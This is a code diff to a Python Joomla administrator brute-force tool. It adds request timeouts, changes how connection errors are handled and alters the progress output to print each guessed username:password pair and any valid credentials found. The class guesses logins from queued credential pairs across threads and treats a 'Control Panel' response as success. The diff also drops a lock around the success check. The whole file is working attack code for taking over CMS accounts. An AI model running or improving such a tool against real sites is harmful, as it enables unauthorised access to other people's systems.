@@ -58,13 +58,16 @@ class JoomlaBruteforce:
     def get_initial_cookies(self):
         try:
             response = requests.get(
-                self.args.url + "/administrator/", proxies=self.proxy
+                self.args.url + "/administrator/", proxies=self.proxy, timeout=5
             )
             response.raise_for_status()
             return response.cookies.get_dict()
-        except requests.RequestException as e:
-            print(f"Error fetching initial cookies: {e}")
-            exit(1)
+        except requests.exceptions.ConnectionError:
+            print("Error: No internet connection or unable to reach the server.")
+            return False
+        except Exception as e:
+            print(f"Error: {e}")
+            return False
 
     def bruteforce(self):
         users = self.get_users()
@@ -107,18 +110,19 @@ class JoomlaBruteforce:
             user, password = self.queue.get()
 
             if self.attempt_login(session, user, password):
-                with self.lock:
-                    if not self.success:
-                        self.success = True
-                        print(f"Success: {user}:{password}")
-                        self.queue.queue.clear()
-                        return
+                if not self.success:
+                    self.success = True
+                    print(
+                        f"[+] Valid user found:\n\tUser: {user}\n\tPassword: {password}"
+                    )
+                    self.queue.queue.clear()
+                    return
 
             with self.lock:
                 if not self.success:
                     self.payload_attempts += 1
                     if self.payload_attempts % 1 == 0:
-                        print(f"Payloads attempted: {self.payload_attempts}")
+                        print(f"Attacking[{self.payload_attempts}]: {user}:{password}")
 
             self.queue.task_done()
 
@@ -133,6 +137,7 @@ class JoomlaBruteforce:
                 proxies=self.proxy,
                 cookies=cookie,
                 headers=headers,
+                timeout=5,
             )
             response.raise_for_status()
 
@@ -158,13 +163,19 @@ class JoomlaBruteforce:
                 data=data,
                 proxies=self.proxy,
                 headers=headers,
+                timeout=5,
             )
+            response.raise_for_status()
+
             soup = BeautifulSoup(response.text, "html.parser")
             panel_message = soup.find(string="Control Panel")
             if panel_message:
                 return True
             return False
 
+        except requests.exceptions.ConnectionError:
+            print("Error: No internet connection or unable to reach the server.")
+            return False
         except Exception as e:
             return False
 
